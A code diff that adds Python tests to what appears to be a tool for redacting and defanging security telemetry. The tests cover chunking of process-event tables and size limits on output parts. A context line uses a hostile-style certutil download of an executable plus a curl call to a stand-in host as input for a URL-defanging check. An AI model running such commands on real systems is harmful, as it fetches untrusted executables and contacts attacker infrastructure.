@@ -285,3 +285,27 @@ def test_scheme_defanged_when_host_is_known(tmp_path):
     m.refresh_sweep()
     out = m.text("certutil -urlcache -f http://cdn-1a2b.test/dl/x.php a.exe && curl https://cdn-1a2b.test/gate")
     assert "http://" not in out and "https://" not in out and out.count("hxxp") == 2, out
+
+
+def test_split_block_keeps_every_row():
+    from masquer.case import split_block
+    rows = [f"«HOST_{i:04d}»\tProcessCreated\t{'x' * 50}" for i in range(1, 301)]
+    block = "## DeviceProcessEvents\n\n300 collapsed rows.\n\nDATA (untrusted, tab-separated):\n```tsv\n" \
+            "DeviceName\tActionType\tPad\n" + "\n".join(rows) + "\n```\n"
+    assert split_block(block, len(block)) == [block]
+    chunks = split_block(block, 4_000)
+    assert len(chunks) > 4 and all(len(c) <= 4_000 for c in chunks)
+    got = [line for c in chunks for line in c.split("```tsv\n", 1)[1].split("\n")[1:-2]]
+    assert got == rows  # every row once, in order
+    assert all(c.startswith("## DeviceProcessEvents (rows ") and "\nDeviceName\tActionType\tPad\n" in c
+               for c in chunks)
+    assert chunks[-1].startswith("## DeviceProcessEvents (rows ") and " of 300)" in chunks[-1]
+
+
+def test_outbox_parts_respect_size(synth_case):
+    case, _, canaries = synth_case
+    parts = case.outbox(None, 20_000, allow_without_ner=True)
+    texts = [p.read_text("utf-8") for p in parts]
+    assert len(parts) > 1 and all(len(t) <= 20_000 + 32 for t in texts)
+    text = "".join(texts).casefold()
+    assert not {v for k, vals in canaries.items() if k not in NER_KINDS for v in vals if v.casefold() in text}
